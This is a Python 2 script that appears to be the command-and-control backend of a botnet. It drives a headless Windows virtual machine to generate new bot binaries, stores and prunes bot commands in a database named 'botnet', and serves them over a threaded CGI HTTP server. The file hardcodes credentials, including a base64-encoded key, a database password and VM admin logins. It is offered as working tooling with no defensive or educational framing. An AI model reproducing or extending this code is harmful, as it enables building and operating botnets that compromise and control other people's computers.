#!/usr/bin/python
import subprocess
import threading
import os
import urlparse
import sys
import psycopg2
import time
import traceback
import base64
import cgitb; cgitb.enable()
import argparse
import hashlib
from uuid import uuid4
from CGIHTTPServer import CGIHTTPRequestHandler
from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer
from SocketServer import ThreadingMixIn
key = 'aHVudGVyOm5ldmVybWluZHRoZWJvbGxvY2tz'
db = psycopg2.connect(dbname='botnet', user='anon', host='localhost', password='tfrdyg45')
sql = db.cursor()
db.autocommit = True
exit = False
FNULL = open(os.devnull, 'w')


class Thread(threading.Thread):
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""

    def __init__(self, group=None, target=None, name=None, args=(), kwargs=None, verbose=None):
        threading.Thread.__init__(self, group=group, target=target, name=name, args=args, kwargs=kwargs, verbose=verbose)
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    pass


def check():
    while True:
        if exit == True:
            break

        count = 0
        for line in open('cache/binary_data').xreadlines(): count += 1
   
        if count < 1:
            s = subprocess.Popen("vboxmanage --nologo guestcontrol Windows run --exe 'cmd.exe' --username admin --password password --verbose --wait-stdout -- 'cmd' '/c' 'C:\\main\\create.py'", stderr=FNULL, stdout=FNULL, shell=True).wait()
            count1 = 0
            for line in open('cache/binary_data'):
                count1 += 1
                if count1 > count:
                    sys.stderr.write('\n[Created binary] ID: ' + line.split(',')[1] + ', md5: ' + md5(base64.urlsafe_b64decode(line.split(',')[0]) + '\n'))
            
        else:
            time.sleep(.5)


def database_jobs():
    while True:
        if exit == True:
            break

        sql.execute("DELETE FROM cmds WHERE starttime IS NOT NULL AND running IS FALSE RETURNING *")
        time.sleep(86400)


def md5(s):
        hash_md5 = hashlib.md5()
        hash_md5.update(s)
        return hash_md5.hexdigest()


def main():
    subprocess.Popen("vboxmanage startvm 'Windows' --type headless", stderr=FNULL, stdout=FNULL, shell=True).wait()
    createbot_thread = Thread(target=check)
    createbot_thread.start()

    database_manage_thread = Thread(target=database_jobs)
    database_manage_thread.start()
            

    server_address = ('', args.port)
    httpd = ThreadedHTTPServer(server_address, CGIHTTPRequestHandler)

    while True:
        sys.stdout.flush()
        httpd.handle_request()
        if exit == True:
            break

    return

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('port', type=int, default=8080)
        args = parser.parse_args()

        main()

    except KeyboardInterrupt:
        pass

    except IndexError:
        pass

    except:
        traceback.print_exc()

    finally:
        sys.stderr.write('\nShutting down...\n')
        exit = True
        db.commit()
        db.close()

        time.sleep(8)
        os.kill(os.getpid(), 9) # otherwise the port stays open
